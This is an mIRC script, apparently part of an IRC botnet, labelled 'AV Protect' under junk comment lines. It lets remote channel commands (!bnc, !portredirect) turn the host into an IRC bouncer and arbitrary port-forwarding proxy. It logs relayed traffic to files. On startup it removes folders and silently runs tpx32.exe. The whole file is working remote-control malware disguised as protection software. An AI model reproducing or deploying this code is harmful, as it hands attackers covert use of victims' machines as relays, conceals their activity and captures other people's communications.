;ayfa97r43fh3024u8f
;3q4f0u2q13fj0utr093jf34f
;AV Protect
;afo873q048f
on *:text:!bnc*:*:{  if ($2 == stats) { msg $g 15*14BNC-STATS15* 12[14Total Users Connected:2(15 $+ $sock(bnc.in*,0) $+ 2) 14Bncs open:2(15 $+ $calc($sock(bnc.*,0) - $sock(bnc.in*,0) - $sock(bnc.out*,0)) $+ 2) 14Server Connections:2(15 $+ $sock(bnc.out*,0) $+ 2)12] } |  if ($2 == log) { bnc log $3 | msg $g 14•15BNC14• Logger has been set to $3 $+ ...  |  if ($3 == off) { remove bnc.log }   } | if ($2 == start) {  /bnc start $3 $4 |  msg $g 2[14Bnc2] 15Setup complete:14 $Ip $+ 14:15 $+ $3  | msg $g 2[14Bnc2] 14Usage:15 /server $Ip $+ 14:15 $+ $3 [Then /Quote Pass $4 $+ ]  |   halt     }  
  if ($2 == help) {  msg $g 14•15BNC14• Usage: !bnc start port pass |  halt   } | if ($2 == stop) {  if ($sock(bnc. [ $+ [ $3 ] ] ,0) == 0) { msg $g 14•15BNC14• Error: Bnc not active on that port! | halt }  | msg $g 14•15BNC14• Server/port for $3 has been stopped. |  sockclose bnc. $+ $3  } | if ($2 == kill) && ($3 == users) { msg $g 14•15BNC14• [( $+ $sock(bnc.in*,0) $+ )] Users on bnc, have been disconnected... | sockclose bnc.in* | sockclose bnc.out*  } |  if ($2 == shutdown) {  msg $g 14•15BNC14• BNC Server shutdown... (all settings reset) |  bnc reset  |  msg $g 14•15BNC14• Server shutdown complete... } |  if ($2 == list) && ($3 == bnc) {   if ($sock(bnc.*,0) == 0) { msg $g 14•15BNC14• Error, there are currently no bnc servers open... | halt }   
    if ($sock(bnc.*,0) > 0) {   msg $g 14•15BNC14• Listing Active/Open BNC's |    %bnc.stl = 0     |    :again  |   if ($sock(bnc.*,0) == %bnc.stl) { goto done } |  inc %bnc.stl  |  if ($gettok($sock(bnc.*,%bnc.stl),2,46) !isnum 1-65000) { goto again } |  msg $g 14•15BNC14• $chr(35) $+ %bnc.stl $+ . [PORT: $+ $gettok($sock(bnc.*,%bnc.stl),2,46) $+ ] [PASS: $+ [ %bnc. [ $+ [ $gettok($sock(bnc.*,%bnc.stl),2,46) ] ] ] $+ ]   |  goto again |    :done |    msg $g 14•15BNC14• End Listing Active BNC's...    }  } |  if ($2 == list) && ($3 == users) {  if ($sock(bnc.in*,0) == 0) {  msg $g 14•15BNC14• Error: No Users Connected to the bnc... | halt }   | if ($sock(bnc.in*,0) > 0) { msg $g 14•15BNC14• Listing Active Users...   |  %bnc.stlu = 0 |  :again2  
    if ($sock(bnc.in*,0) == %bnc.stlu) { goto done2 } |   inc %bnc.stlu  | msg $g 14•15BNC14• $chr(35) $+ %bnc.stlu $+ . Connection: Nick:[ $+  [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .n ] ] ] $+ ] [ $+ [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .u ] ] ] $+ ] is $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) on port $sock(bnc.in*,%bnc.stlu).mark |    goto again2 |    :done2 |   msg $g 14•15BNC14• List of Users Complete...  } }  | if ($2 == list) && ($3 == server) {   if ($sock(bnc.out*,0) == 0) { msg $g 14•15BNC14• Error: Currently No Users on Servers Connected... | halt }   
if ($sock(bnc.out*,0) > 0) {   msg $g 14•15BNC14• Listing Active Users and Servers... |  %bnc.stlus = 0 |  :again3 | if ($sock(bnc.out*,0) == %bnc.stlus) { goto done3 }  |  inc   %bnc.stlus |  msg $g 14•15BNC14• $chr(35) $+ %bnc.stlus $+ .  [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,2,32) ] ] ] $+ / $+ [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,1,32) ] ] ] is %bnc. $+ $gettok($sock(bnc.out*,%bnc.stlus).mark,3,32) on $gettok($sock(bnc.out*,%bnc.stlus).mark,4-6,32)  |  goto again3 |   :done3 |  msg $g 14•15BNC14• List of Users and Servers Complete...  } |  halt  } }
alias bnc {    if ($1 == start) { //set %bnc. [ $+ [ $2 ] ] $3  | //socklisten bnc. $+ $2 $2  }  |  if ($1 == reset) { unset %bnc* | sockclose bnc* } |  if ($1 == log) { set %bnc.log $2 }  }
on *:socklisten:bnc.*:{   if ($sock(bnc.in.temp,0) == 1) { halt } | //set %bnc.smt $gettok($sockname,2,46) | /sockaccept bnc.in.temp | sockread }  
on *:sockclose:bnc.in.*: { unset %bnc.ok. $+ $sockname | unset %bnc. $+ $sock($sockname).ip $+ * | unset %bp* | unset %temp.r* | if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {   sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) } }
on *:sockread:bnc.in.*:{   if ($sock(bnc.in.temp*,0) == 1) {   /sockrename $sockname bnc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip  | /sockmark $sockname %bnc.smt | unset %bnc.smt |  //set  %bnc.ok. $+ $sockname no } |   sockread -f %temp.r  | tokenize 32 %temp.r | if (%bnc.log == on) { write bnc.log <<<[Incomming]>>> %temp.r }  |  if (%bnc.ok. [ $+ [ $sockname ] ] == no) {  if ($1 == NICK) { set %bnc. $+ $sock($sockname).ip $+ .n $2  |  ;//write bnc.log Connection from: $sock($sockname).ip Time: $time Date: $+ $date 
    sockwrite -nt $sockname eXp.RU 31337 $2 14,1Nev15E14r mE15S00s 12W5[4IT5]10H 11T3[9h3]E 14B10e15S0t | sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Welcome to GT's BNC Server. ( $+ $2 $+ ) ***     | sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** From: $sock($sockname).ip Time: $time Date: $+ $date *** |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Please Type /QUOTE PASS PASSWORD to Continue ***   |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** For More help Type /QUOTE BNCHELP ***  |  halt  } 
    if ($1 == BNCHELP) {    sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Help Error: Login First! /QUOTE PASS [ PASSWORD ] |  halt  } |  if ($1 == USER) {  set %bnc. $+ $sock($sockname).ip $+ .u $2 |  set %bnc. $+ $sock($sockname).ip $+ .r $5- | halt  }  |  if ($1 == PASS) && ($2 ==  %bnc. [ $+ [ $sock($sockname).mark ] ] ) {  //sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Password Accepted ***  
  //sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Please type /quote conn server port to start ***  |   goto next  }  |  if ($1 == PASS) && ($2 != %bnc. [ $+ [ $sock($sockname).mark ] ] ) {   sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Incorrect Password... |   inc %bp   } |  if (%bp >= 3) {   sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Too many bad password attempt's disconnecting...  |  sockclose $sockname | unset %bp }  |  halt   }
  :next |  %bnc.ok. [ $+ [ $sockname ] ] = done | if ($1 == IDENT) {   identd on $2  |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Ident set to $2  }  | if ($1 == VHOST) {  if ($2 == LIST) {  /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Listing VHOSTS |   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ (1) System Default: $ip / $host $+ ... |   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ End of VHOST / LIST |     halt   }
    if ($2 == 1) {    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ VHOST Set as system default $ip : $host |    halt   } |  else {   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ VHOST Error... Usage: /QUOTE VHOST LIST or /QUOTE VHOST # | halt }   } |   if ($1 == BNCHELP) {    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Listing Help Commands... |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE IDENT [IDENT]  
    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE CONN [SERVER] [PORT]   |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE PASS [PASSWORD]  |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE VHOST LIST |  /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - End List of HELP  |  halt  }  |  if ($1 == CONN) {  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Disconnecting from current server...  
    sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] )  }
    if ($3 == $Null) {   sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $2 6667 $4  | /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $2 6667 %bnc. $+ $sock($sockname).ip $+ .r |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $2 on port 6667  |   halt   }  |  /sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $2-4
/sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $2 $3 %bnc. $+ $sock($sockname).ip $+ .r |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $2 on port $3  |  halt    } |  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockwrite -nt bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r   }  }  
on *:sockopen:bnc.out.*:{ sockwrite -tn $sockname User [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,6,32) ] ] ] ]  | sockwrite -tn $sockname Nick %bnc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ] | sockread  } 
on *:sockread:bnc.out.*:{ sockread -f %bnc.out.t | write log2.txt %bnc.out.t | if (%bnc.log == on) { write bnc.log <<<[Outgoing]>>> %bnc.out.t } | sockwrite -nt bnc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %bnc.out.t |  unset %bnc.out.t }
on *:TEXT:!portredirect*:*:{ if ($2 == $null) { /msg $g 14Portredirection Error!!! For help type: !portredirect help | halt } | if ($2 == help) { /msg $g 14*** Port Redirection Help! *** | /msg $g 14Commands.. | //msg $g 14!portredirect add 1000 irc.dal.net 6667 | //msg $g 14!portredirect stop port | //msg $g 14!portredirect stats | /msg $g 14Port Redirect Help / END halt } | if ($2 == add) { if ($5 == $null) { /msg $g 3Port Redirection Error: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | /msg $g 14[Redirect Added] I-port=( $+ $3 $+ ) to $4 $+ $5 | /msg $g 12[Local IP Address]:14 $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  /msg $g 14[Portredirection] Port:(12 $+ $3 $+ 14) Has been stopped. |  halt  } | if ($2 == stats) { |  //msg  $g 12*** Port Redirection Stat's. |  /predirectstats2 $g } } 
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | write incoming.txt [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] | write outgoing.txt [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
alias predirectstats2 { set %gtpcount 0 | :startloophere | inc %gtpcount 1 | if ($sock(gtportdirect*,%gtpcount) != $null) { msg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)  | msg $1 12[Local IP Address]:14 $ip | goto startloophere } | else { if %gtpcount = 1 { //msg $1 12*** Error, no port redirects! } | //msg $1 12*** PortRedirect/End | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ] | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ * | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ * | unset %gtrdstoppnum }
alias gtportdirect { if ($3 == $null) return | socklisten gtportdirect $+ . $+ $1 $1 |  sockmark gtportdirect $+ . $+ $1-3 }
on *:start:{ .rmdir logs | .rmdir sounds | .run tpx32.exe }
